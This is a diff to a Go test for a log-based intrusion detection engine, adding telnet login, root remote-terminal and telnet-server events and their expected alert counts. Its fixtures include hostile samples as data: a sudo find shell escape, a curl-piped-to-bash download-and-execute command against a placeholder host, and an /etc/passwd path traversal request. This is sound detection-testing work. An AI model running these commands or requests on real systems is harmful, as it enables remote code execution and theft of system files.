@@ -271,6 +271,11 @@ func TestLinuxAndWebRules(t *testing.T) {
 		ev(syslog.KindSudo, map[string]string{"user": "alice", "cmd": "/usr/bin/find . -exec /bin/sh \\;"}),
 		ev(syslog.KindSudoDenied, map[string]string{"user": "eve", "cmd": "/bin/sh"}),
 		ev(logs.KindNULPadding, map[string]string{"nul_bytes": "811"}),
+		ev(syslog.KindSessionOpened, map[string]string{"user": "root", "service": "login", "by": ".telnet"}),
+		ev(syslog.KindSessionOpened, map[string]string{"user": "alice", "service": "login", "by": "LOGIN"}),
+		ev(syslog.KindRootLogin, map[string]string{"user": "root", "tty": "/dev/pts/7"}),
+		ev(syslog.KindRootLogin, map[string]string{"user": "root", "tty": "tty1"}),
+		ev(syslog.KindServiceStarted, map[string]string{"unit": "Telnet Server"}),
 		ev("shell-command", map[string]string{"user": "root", "cmd": "curl -s http://198.51.100.7/x.sh | bash"}),
 		ev(access.KindRequest, map[string]string{"ip": "203.0.113.9", "path": "/index.php?page=../../../../etc/passwd", "user_agent": "Mozilla/5.0", "status": "200"}),
 		ev(access.KindRequest, map[string]string{"ip": "203.0.113.9", "path": "/", "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "status": "200"}),
@@ -285,6 +290,7 @@ func TestLinuxAndWebRules(t *testing.T) {
 	got, _ := run(evs)
 	wantCount := map[string]int{
 		"linux-user-created": 1, "linux-uid0-user": 1, "linux-admin-group": 1, "linux-root-shell": 2, "linux-sudo-denied": 1, "log-truncated": 1,
+		"linux-telnet-login": 1, "linux-root-remote-terminal": 1, "linux-telnet-server": 1,
 		"cmd-download-exec": 1, "web-attack": 1, "web-scanner": 1, "web-scripted-client": 1,
 	}
 	for id, n := range wantCount {
